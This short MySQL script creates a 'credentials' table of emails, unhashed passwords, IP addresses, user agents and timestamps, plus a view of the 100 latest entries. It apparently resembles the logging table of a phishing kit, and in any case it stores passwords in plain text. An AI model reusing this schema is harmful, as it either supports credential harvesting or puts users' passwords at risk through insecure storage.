-- Create the credentials table
-- Using minimal fields and data types to save space
CREATE TABLE IF NOT EXISTS credentials (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(100) NOT NULL,
    password VARCHAR(100) NOT NULL,
    ip VARCHAR(45) NOT NULL,
    user_agent VARCHAR(255) NOT NULL,
    date_time DATETIME NOT NULL,
    -- Adding an index on date_time for faster queries
    INDEX (date_time)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Optional: Create a view for easier querying
CREATE OR REPLACE VIEW recent_credentials AS
SELECT * FROM credentials ORDER BY date_time DESC LIMIT 100; 